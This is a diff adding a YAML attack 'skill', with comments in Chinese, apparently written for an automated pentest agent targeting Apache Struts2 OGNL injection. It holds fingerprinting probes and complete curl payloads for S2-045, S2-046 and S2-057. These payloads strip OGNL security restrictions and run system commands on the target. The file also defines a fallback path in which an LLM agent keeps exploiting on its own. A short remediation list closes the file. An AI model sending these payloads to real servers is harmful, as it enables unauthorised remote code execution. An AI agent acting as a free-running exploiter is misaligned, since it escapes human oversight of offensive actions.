@@ -1,0 +1,185 @@
+# ═══════════════════════════════════════════════════════════
+# Apache Struts2 OGNL 注入 RCE
+#
+# 原理: Struts2 在多处使用 OGNL 表达式引擎解析用户输入
+#       恶意 OGNL 表达式 → 调用 Runtime.exec() → RCE
+# 覆盖: S2-045, S2-046, S2-048, S2-057, S2-061 等
+# ═══════════════════════════════════════════════════════════
+skill_id: struts2_ognl_rce
+name: "Struts2 OGNL 表达式注入 RCE"
+category: web_rce
+version: "1.0"
+
+principle: |
+  Struts2 框架大量使用 OGNL（Object-Graph Navigation Language）表达式
+  来处理请求参数、Action 映射、错误消息等。多个历史漏洞允许攻击者在
+  不同注入点插入恶意 OGNL 表达式。
+  
+  核心 OGNL 执行链:
+    #rt = @java.lang.Runtime@getRuntime()
+    #rt.exec('命令')
+  
+  主要注入点:
+  - S2-045/046: Content-Type 头（multipart 解析异常时 OGNL 求值）
+  - S2-048: ActionMessage 中的 OGNL 注入
+  - S2-057: namespace/result 配置中的 OGNL 注入（URL 路径）
+  - S2-061: 标签属性的二次 OGNL 求值
+  
+  检测特征:
+  - 响应头/页面中出现 struts、opensymphony、xwork
+  - .action / .do 后缀的 URL
+  - 框架错误页面泄露 Struts 版本
+
+match:
+  rules:
+    - fingerprint_contains: ["struts"]
+    - fingerprint_contains: ["opensymphony"]
+    - evidence_contains: ["struts", "S2-"]
+    - evidence_contains: [".action"]
+    - cve_matches:
+        - "CVE-2017-5638"
+        - "CVE-2017-9805"
+        - "CVE-2018-11776"
+
+probes:
+  - id: confirm_struts
+    description: "确认 Struts2 框架（通过错误触发特征响应）"
+    steps:
+      - command: |
+          curl -s -D - {ENDPOINT} \
+            -H "Content-Type: %{(#test='multipart/form-data')}" \
+            --max-time 10
+        parse_rules:
+          - if_contains: ["struts", "opensymphony", "xwork", "OGNL"]
+            set: { struts_confirmed: true }
+          - if_contains: ["jakarta", "multipart"]
+            set: { struts_confirmed: true, multipart_present: true }
+
+      # 尝试 .action 后缀访问
+      - command: |
+          curl -s -o /dev/null -w "%{http_code}" \
+            {ENDPOINT}/test.action --max-time 10
+        parse_rules:
+          - if_contains: ["404", "200", "302"]
+            set: { action_suffix_works: true }
+
+      # 检查是否有 DevMode 或详细错误
+      - command: |
+          curl -s {ENDPOINT}/%24%7B1%2B1%7D --max-time 10
+        parse_rules:
+          - if_contains: ["struts"]
+            set: { struts_confirmed: true }
+
+exploit_paths:
+  # ═══ 路径 A: S2-045 Content-Type OGNL 注入 ═══
+  - path_id: s2_045
+    name: "S2-045 Content-Type OGNL 注入"
+    priority: 1
+    principle: |
+      Struts2 使用 Jakarta Multipart 解析器处理 Content-Type 时，
+      如果 Content-Type 不合法触发异常，异常消息中的 OGNL 表达式
+      会被求值。影响 Struts 2.3.5 ~ 2.3.31, 2.5 ~ 2.5.10。
+    conditions:
+      struts_confirmed: true
+    steps:
+      - id: s2045_detect
+        description: "S2-045 探测：通过 Content-Type 注入添加响应头"
+        command: |
+          curl -s -D - {ENDPOINT} \
+            -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-S2-Test','S2-045-OK')}.multipart/form-data" \
+            --max-time 10
+        timeout: 15
+        success_criteria:
+          stdout_contains_any: ["X-S2-Test", "S2-045-OK"]
+        on_success: s2045_rce
+        on_fail: next_path
+
+      - id: s2045_rce
+        description: "S2-045 RCE: 通过 OGNL 执行系统命令"
+        command: |
+          curl -s {ENDPOINT} \
+            -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" \
+            --max-time 15
+        timeout: 20
+        success_criteria:
+          stdout_contains_any: ["uid=", "gid="]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          current_user: stdout
+          shell_type: "rce_s2045"
+
+  # ═══ 路径 B: S2-057 namespace OGNL 注入 ═══
+  - path_id: s2_057
+    name: "S2-057 namespace OGNL 注入"
+    priority: 2
+    principle: |
+      当 Struts2 的 result 配置使用了 namespace（如 redirectAction），
+      且 namespace 来自用户输入时，可注入 OGNL 表达式。
+      影响 Struts 2.3 ~ 2.3.34, 2.5 ~ 2.5.16。
+    conditions:
+      struts_confirmed: true
+    steps:
+      - id: s2057_detect
+        description: "S2-057: URL 路径中注入 OGNL 表达式"
+        command: |
+          curl -s -D - -o /dev/null \
+            "{ENDPOINT}/%24%7B233*233%7D/actionChain1.action" \
+            --max-time 10
+        timeout: 15
+        success_criteria:
+          stdout_contains_any: ["54289", "Location"]
+        on_success: s2057_rce
+        on_fail: next_path
+
+      - id: s2057_rce
+        description: "S2-057 RCE"
+        command: |
+          curl -s "{ENDPOINT}/%24%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec('id')).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D/actionChain1.action" \
+            --max-time 15
+        timeout: 20
+        success_criteria:
+          stdout_contains_any: ["uid="]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "rce_s2057"
+
+  # ═══ 路径 C: S2-046 Content-Disposition 注入 ═══
+  - path_id: s2_046
+    name: "S2-046 Content-Disposition OGNL 注入"
+    priority: 3
+    principle: |
+      类似 S2-045，但注入点在 multipart 请求的 Content-Disposition
+      的 filename 参数中。某些 WAF 可能放行此路径。
+    conditions:
+      struts_confirmed: true
+    steps:
+      - id: s2046_rce
+        description: "S2-046: 通过文件上传 filename 注入 OGNL"
+        command: |
+          curl -s {ENDPOINT} \
+            -F "upload=@/dev/null;filename=%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())};\x00b" \
+            --max-time 15
+        timeout: 20
+        success_criteria:
+          stdout_contains_any: ["uid="]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "rce_s2046"
+
+  # ═══ 路径 D: LLM 兜底 ═══
+  - path_id: llm_freeform
+    name: "LLM 自由推理"
+    priority: 99
+    mode: react_freeform
+    max_rounds: 5
+    conditions:
+      struts_confirmed: true
+
+remediation: |
+  1. 升级 Struts2 至最新稳定版
+  2. 使用 Struts2 安全插件限制 OGNL 表达式执行
+  3. WAF 过滤 Content-Type 中的 OGNL 特征（%{, #context, @java）
+  4. 移除不必要的 DevMode 和详细错误输出
